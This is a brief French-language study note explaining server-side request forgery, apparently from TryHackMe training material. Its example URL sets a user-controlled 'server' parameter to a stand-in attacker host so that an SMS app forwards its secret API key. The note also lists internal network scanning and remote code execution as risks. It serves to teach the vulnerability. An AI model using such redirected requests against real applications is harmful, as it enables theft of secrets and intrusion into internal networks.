Une faille **SSRF** apparaît lorsqu’une application web peut être manipulée pour envoyer des requêtes à des destinations arbitraires, contrôlées par l’attaquant.

### 🔹 Exemple concret

- Une appli envoie des SMS via une API externe en utilisant une **clé secrète**.
    
- Le paramètre `server` est exposé à l’utilisateur.
    
- Un attaquant peut le modifier pour rediriger la requête vers son propre serveur → il intercepte alors la requête **avec la clé API**.
    
- Ex. :
    
    `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
    
    Fait que le serveur envoie la requête vers :
    
    `https://attacker.thm/api/send?msg=ABC`
    

### 🔹 Risques et usages avancés de SSRF

- **Énumération réseau interne** (IP, ports).
    
- **Accès à des services internes protégés** via relations de confiance.
    
- **Interaction avec services non-HTTP** pouvant mener à de l’exécution de code à distance (RCE).